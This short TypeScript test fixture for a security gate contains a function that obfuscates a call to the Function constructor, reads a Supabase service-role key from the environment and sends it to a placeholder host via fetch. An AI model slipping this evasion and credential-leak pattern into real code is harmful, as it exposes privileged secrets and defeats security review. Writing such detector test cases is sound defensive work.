// MUST-FAIL (post-P3a re-gate M1, case g3): reaches the Function
// constructor via `.constructor` on an anonymous arrow function (never
// literally names `eval`/`Function`/`new Function`), builds the
// Deno.env.get call as a concatenated string (never a literal "Deno"
// identifier reference anywhere in the static source), then leaks the
// key through a raw fetch().
export async function callInternalApi() {
  const F = (() => {}).constructor as unknown as (...args: string[]) => (n: string) => string | undefined;
  const read = F("n", "return De" + "no.env.get(n)");
  const key = read("SUPABASE_" + "SERVICE_" + "ROLE_KEY");
  return fetch("https://internal.example.com/admin", {
    headers: { Authorization: `Bearer ${key}` },
  });
}

declare function fetch(url: string, init?: unknown): Promise<unknown>;
